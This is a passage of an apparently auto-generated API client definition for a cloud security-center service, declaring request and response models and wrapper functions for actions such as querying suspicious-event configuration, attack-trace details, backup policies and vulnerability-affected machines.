  body: DescribeSuspiciousOverallConfigResponseBody(name='body'),
}

async function describeSuspiciousOverallConfigWithOptions(request: DescribeSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousOverallConfig(request: DescribeSuspiciousOverallConfigRequest): DescribeSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousOverallConfigWithOptions(request, runtime);
}

model DescribeSuspiciousUUIDConfigRequest {
  type?: string(name='Type'),
}

model DescribeSuspiciousUUIDConfigResponseBody = {
  count?: int32(name='Count'),
  requestId?: string(name='RequestId'),
  UUIDList?: [ string ](name='UUIDList'),
}

model DescribeSuspiciousUUIDConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousUUIDConfigResponseBody(name='body'),
}

async function describeSuspiciousUUIDConfigWithOptions(request: DescribeSuspiciousUUIDConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousUUIDConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousUUIDConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousUUIDConfig(request: DescribeSuspiciousUUIDConfigRequest): DescribeSuspiciousUUIDConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousUUIDConfigWithOptions(request, runtime);
}

model DescribeTargetRequest {
  config?: string(name='Config'),
  type?: string(name='Type'),
}

model DescribeTargetResponseBody = {
  requestId?: string(name='RequestId'),
  targets?: [ 
    {
      flag?: string(name='Flag'),
      target?: string(name='Target'),
      targetType?: string(name='TargetType'),
    }
  ](name='Targets'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTargetResponseBody(name='body'),
}

async function describeTargetWithOptions(request: DescribeTargetRequest, runtime: Util.RuntimeOptions): DescribeTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTarget(request: DescribeTargetRequest): DescribeTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTargetWithOptions(request, runtime);
}

model DescribeTaskErrorLogRequest {
  buildTaskId?: string(name='BuildTaskId'),
}

model DescribeTaskErrorLogResponseBody = {
  logs?: [ 
    {
      text?: string(name='Text'),
    }
  ](name='Logs'),
  requestId?: string(name='RequestId'),
}

model DescribeTaskErrorLogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTaskErrorLogResponseBody(name='body'),
}

async function describeTaskErrorLogWithOptions(request: DescribeTaskErrorLogRequest, runtime: Util.RuntimeOptions): DescribeTaskErrorLogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.buildTaskId)) {
    query['BuildTaskId'] = request.buildTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTaskErrorLog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTaskErrorLog(request: DescribeTaskErrorLogRequest): DescribeTaskErrorLogResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTaskErrorLogWithOptions(request, runtime);
}

model DescribeTotalStatisticsRequest {
  from?: string(name='From'),
  groupId?: long(name='GroupId'),
  remark?: string(name='Remark'),
}

model DescribeTotalStatisticsResponseBody = {
  account?: int32(name='Account'),
  health?: int32(name='Health'),
  healthTotal?: int32(name='HealthTotal'),
  healthdealedTotal?: int32(name='HealthdealedTotal'),
  healthhighTotal?: int32(name='HealthhighTotal'),
  healthlowTotal?: int32(name='HealthlowTotal'),
  healthmediumTotal?: int32(name='HealthmediumTotal'),
  healthseriousTotal?: int32(name='HealthseriousTotal'),
  newsuspicious?: int32(name='Newsuspicious'),
  online?: boolean(name='Online'),
  patch?: int32(name='Patch'),
  requestId?: string(name='RequestId'),
  suspicious?: int32(name='Suspicious'),
  suspiciousTotal?: int32(name='SuspiciousTotal'),
  suspiciousdealedTotal?: int32(name='SuspiciousdealedTotal'),
  suspicioushighTotal?: int32(name='SuspicioushighTotal'),
  suspiciouslowTotal?: int32(name='SuspiciouslowTotal'),
  suspiciousmediumTotal?: int32(name='SuspiciousmediumTotal'),
  suspiciousseriousTotal?: int32(name='SuspiciousseriousTotal'),
  trojan?: int32(name='Trojan'),
  vul?: int32(name='Vul'),
  vulAsapSum?: int32(name='VulAsapSum'),
  vulDealedTotal?: int32(name='VulDealedTotal'),
  vulLaterSum?: int32(name='VulLaterSum'),
  vulNntfSum?: int32(name='VulNntfSum'),
  vulTotal?: int32(name='VulTotal'),
}

model DescribeTotalStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTotalStatisticsResponseBody(name='body'),
}

async function describeTotalStatisticsWithOptions(request: DescribeTotalStatisticsRequest, runtime: Util.RuntimeOptions): DescribeTotalStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTotalStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTotalStatistics(request: DescribeTotalStatisticsRequest): DescribeTotalStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTotalStatisticsWithOptions(request, runtime);
}

model DescribeTraceInfoDetailRequest {
  from?: string(name='From'),
  incidentTime?: long(name='IncidentTime'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
  vertexId?: string(name='VertexId'),
}

model DescribeTraceInfoDetailResponseBody = {
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  traceInfoDetail?: {
    edgeList?: [ 
      {
        count?: int32(name='Count'),
        endId?: string(name='EndId'),
        startId?: string(name='StartId'),
        time?: string(name='Time'),
        type?: string(name='Type'),
      }
    ](name='EdgeList'),
    entityTypeList?: [ 
      {
        dbId?: int32(name='DbId'),
        displayColor?: string(name='DisplayColor'),
        displayIcon?: string(name='DisplayIcon'),
        displayTemplate?: string(name='DisplayTemplate'),
        gmtCreate?: long(name='GmtCreate'),
        gmtModified?: long(name='GmtModified'),
        id?: string(name='Id'),
        limit?: int32(name='Limit'),
        name?: string(name='Name'),
        namespace?: string(name='Namespace'),
        offset?: int32(name='Offset'),
      }
    ](name='EntityTypeList'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed'),
        displayColor?: string(name='DisplayColor'),
        name?: string(name='Name'),
        relationTypeId?: string(name='RelationTypeId'),
        showType?: string(name='ShowType'),
      }
    ](name='RelationTypeList'),
    vertexList?: [ 
      {
        count?: int32(name='Count'),
        id?: string(name='Id'),
        name?: string(name='Name'),
        neighborList?: [ 
          {
            count?: int32(name='Count'),
            hasMore?: boolean(name='HasMore'),
            type?: string(name='Type'),
          }
        ](name='NeighborList'),
        time?: string(name='Time'),
        type?: string(name='Type'),
      }
    ](name='VertexList'),
  }(name='TraceInfoDetail'),
}

model DescribeTraceInfoDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoDetailResponseBody(name='body'),
}

async function describeTraceInfoDetailWithOptions(request: DescribeTraceInfoDetailRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoDetail(request: DescribeTraceInfoDetailRequest): DescribeTraceInfoDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoDetailWithOptions(request, runtime);
}

model DescribeTraceInfoNodeRequest {
  eventName?: string(name='EventName'),
  from?: string(name='From'),
  incidentTime?: long(name='IncidentTime'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
  vertexId?: string(name='VertexId'),
}

model DescribeTraceInfoNodeResponseBody = {
  node?: {
    name?: string(name='Name'),
    propertyList?: [ 
      {
        name?: string(name='Name'),
        value?: string(name='Value'),
      }
    ](name='PropertyList'),
    type?: string(name='Type'),
  }(name='Node'),
  requestId?: string(name='RequestId'),
}

model DescribeTraceInfoNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoNodeResponseBody(name='body'),
}

async function describeTraceInfoNodeWithOptions(request: DescribeTraceInfoNodeRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoNode(request: DescribeTraceInfoNodeRequest): DescribeTraceInfoNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoNodeWithOptions(request, runtime);
}

model DescribeUniBackupDatabaseRequest {
  currentPage?: int32(name='CurrentPage'),
  databaseType?: string(name='DatabaseType'),
  instanceName?: string(name='InstanceName'),
  pageSize?: int32(name='PageSize'),
  queryType?: string(name='QueryType'),
  uniRegionId?: string(name='UniRegionId'),
}

model DescribeUniBackupDatabaseResponseBody = {
  databaseList?: [ 
    {
      agentStatus?: string(name='AgentStatus'),
      createdByProduct?: string(name='CreatedByProduct'),
      databaseName?: string(name='DatabaseName'),
      databaseType?: string(name='DatabaseType'),
      databaseVersion?: string(name='DatabaseVersion'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      instanceUuid?: string(name='InstanceUuid'),
      policyId?: long(name='PolicyId'),
      status?: string(name='Status'),
    }
  ](name='DatabaseList'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeUniBackupDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupDatabaseResponseBody(name='body'),
}

async function describeUniBackupDatabaseWithOptions(request: DescribeUniBackupDatabaseRequest, runtime: Util.RuntimeOptions): DescribeUniBackupDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryType)) {
    query['QueryType'] = request.queryType;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupDatabase(request: DescribeUniBackupDatabaseRequest): DescribeUniBackupDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupDatabaseWithOptions(request, runtime);
}

model DescribeUniBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  policyName?: string(name='PolicyName'),
}

model DescribeUniBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  uniBackupPolicies?: [ 
    {
      agentErrorMessage?: string(name='AgentErrorMessage'),
      agentStatus?: string(name='AgentStatus'),
      databaseName?: string(name='DatabaseName'),
      databaseType?: string(name='DatabaseType'),
      errorCode?: string(name='ErrorCode'),
      errorMessage?: string(name='ErrorMessage'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      instanceStatus?: string(name='InstanceStatus'),
      instanceUuid?: string(name='InstanceUuid'),
      latestBackResult?: string(name='LatestBackResult'),
      latestBackupTime?: string(name='LatestBackupTime'),
      planStatus?: string(name='PlanStatus'),
      policyId?: long(name='PolicyId'),
      policyName?: string(name='PolicyName'),
      policyStatus?: string(name='PolicyStatus'),
      uniRegionId?: string(name='UniRegionId'),
    }
  ](name='UniBackupPolicies'),
}

model DescribeUniBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPoliciesResponseBody(name='body'),
}

async function describeUniBackupPoliciesWithOptions(request: DescribeUniBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicies(request: DescribeUniBackupPoliciesRequest): DescribeUniBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPoliciesWithOptions(request, runtime);
}

model DescribeUniBackupPolicyDetailRequest {
  policyId?: string(name='PolicyId'),
}

model DescribeUniBackupPolicyDetailResponseBody = {
  requestId?: string(name='RequestId'),
  uniBackupPolicyDTO?: {
    accountName?: string(name='AccountName'),
    agentStatus?: string(name='AgentStatus'),
    databaseType?: string(name='DatabaseType'),
    fullPlan?: {
      days?: [ string ](name='Days'),
      interval?: int32(name='Interval'),
      planType?: string(name='PlanType'),
      startTime?: string(name='StartTime'),
    }(name='FullPlan'),
    incPlan?: {
      days?: [ string ](name='Days'),
      interval?: int32(name='Interval'),
      planType?: string(name='PlanType'),
      startTime?: string(name='StartTime'),
    }(name='IncPlan'),
    instanceId?: string(name='InstanceId'),
    instanceName?: string(name='InstanceName'),
    policyId?: long(name='PolicyId'),
    policyName?: string(name='PolicyName'),
    policyStatus?: string(name='PolicyStatus'),
    retention?: int32(name='Retention'),
    speedLimiter?: long(name='SpeedLimiter'),
  }(name='UniBackupPolicyDTO'),
}

model DescribeUniBackupPolicyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPolicyDetailResponseBody(name='body'),
}

async function describeUniBackupPolicyDetailWithOptions(request: DescribeUniBackupPolicyDetailRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPolicyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicyDetail(request: DescribeUniBackupPolicyDetailRequest): DescribeUniBackupPolicyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPolicyDetailWithOptions(request, runtime);
}

model DescribeUniRecoverableListRequest {
  currentPage?: int32(name='CurrentPage'),
  database?: string(name='Database'),
  pageSize?: int32(name='PageSize'),
  policyId?: long(name='PolicyId'),
}

model DescribeUniRecoverableListResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  database?: string(name='Database'),
  pageSize?: int32(name='PageSize'),
  recoverableInfoList?: [ 
    {
      firstTime?: long(name='FirstTime'),
      lastTime?: long(name='LastTime'),
      resetScn?: string(name='ResetScn'),
      resetTime?: long(name='ResetTime'),
      restoreInfo?: string(name='RestoreInfo'),
    }
  ](name='RecoverableInfoList'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeUniRecoverableListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniRecoverableListResponseBody(name='body'),
}

async function describeUniRecoverableListWithOptions(request: DescribeUniRecoverableListRequest, runtime: Util.RuntimeOptions): DescribeUniRecoverableListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniRecoverableList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniRecoverableList(request: DescribeUniRecoverableListRequest): DescribeUniRecoverableListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniRecoverableListWithOptions(request, runtime);
}

model DescribeUniSupportRegionResponseBody = {
  requestId?: string(name='RequestId'),
  uniSupportRegion?: [ string ](name='UniSupportRegion'),
}

model DescribeUniSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniSupportRegionResponseBody(name='body'),
}

async function describeUniSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeUniSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUniSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniSupportRegion(): DescribeUniSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniSupportRegionWithOptions(runtime);
}

model DescribeUserBackupMachinesResponseBody = {
  machines?: [ 
    {
      id?: long(name='Id'),
      policyName?: string(name='PolicyName'),
      uuid?: string(name='Uuid'),
    }
  ](name='Machines'),
  requestId?: string(name='RequestId'),
}

model DescribeUserBackupMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBackupMachinesResponseBody(name='body'),
}

async function describeUserBackupMachinesWithOptions(runtime: Util.RuntimeOptions): DescribeUserBackupMachinesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUserBackupMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBackupMachines(): DescribeUserBackupMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBackupMachinesWithOptions(runtime);
}

model DescribeUserBaselineAuthorizationRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeUserBaselineAuthorizationResponseBody = {
  requestId?: string(name='RequestId'),
  userBaselineAuthorization?: {
    status?: int32(name='Status'),
  }(name='UserBaselineAuthorization'),
}

model DescribeUserBaselineAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBaselineAuthorizationResponseBody(name='body'),
}

async function describeUserBaselineAuthorizationWithOptions(request: DescribeUserBaselineAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserBaselineAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserBaselineAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBaselineAuthorization(request: DescribeUserBaselineAuthorizationRequest): DescribeUserBaselineAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBaselineAuthorizationWithOptions(request, runtime);
}

model DescribeUserLayoutAuthorizationRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeUserLayoutAuthorizationResponseBody = {
  authorized?: boolean(name='Authorized'),
  requestId?: string(name='RequestId'),
}

model DescribeUserLayoutAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserLayoutAuthorizationResponseBody(name='body'),
}

async function describeUserLayoutAuthorizationWithOptions(request: DescribeUserLayoutAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserLayoutAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserLayoutAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserLayoutAuthorization(request: DescribeUserLayoutAuthorizationRequest): DescribeUserLayoutAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserLayoutAuthorizationWithOptions(request, runtime);
}

model DescribeUuidsByVulNamesRequest {
  dealed?: string(name='Dealed'),
  fieldName?: string(name='FieldName'),
  fieldValue?: string(name='FieldValue'),
  groupId?: long(name='GroupId'),
  lang?: string(name='Lang'),
  level?: string(name='Level'),
  necessity?: string(name='Necessity'),
  remark?: string(name='Remark'),
  searchTags?: string(name='SearchTags'),
  statusList?: string(name='StatusList'),
  tag?: string(name='Tag'),
  targetType?: string(name='TargetType'),
  type?: string(name='Type'),
  vpcInstanceIds?: string(name='VpcInstanceIds'),
  vulNames?: [ string ](name='VulNames'),
}

model DescribeUuidsByVulNamesResponseBody = {
  machineInfoStatistics?: [ 
    {
      machineInstanceId?: string(name='MachineInstanceId'),
      machineIp?: string(name='MachineIp'),
      machineName?: string(name='MachineName'),
      os?: string(name='Os'),
      regionId?: string(name='RegionId'),
      uuid?: string(name='Uuid'),
    }
  ](name='MachineInfoStatistics'),
  requestId?: string(name='RequestId'),
}

model DescribeUuidsByVulNamesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUuidsByVulNamesResponseBody(name='body'),
}

async function describeUuidsByVulNamesWithOptions(request: DescribeUuidsByVulNamesRequest, runtime: Util.RuntimeOptions): DescribeUuidsByVulNamesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.level)) {
    query['Level'] = request.level;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUuidsByVulNames',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUuidsByVulNames(request: DescribeUuidsByVulNamesRequest): DescribeUuidsByVulNamesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUuidsByVulNamesWithOptions(request, runtime);
}

model DescribeVendorListResponseBody = {
  requestId?: string(name='RequestId'),
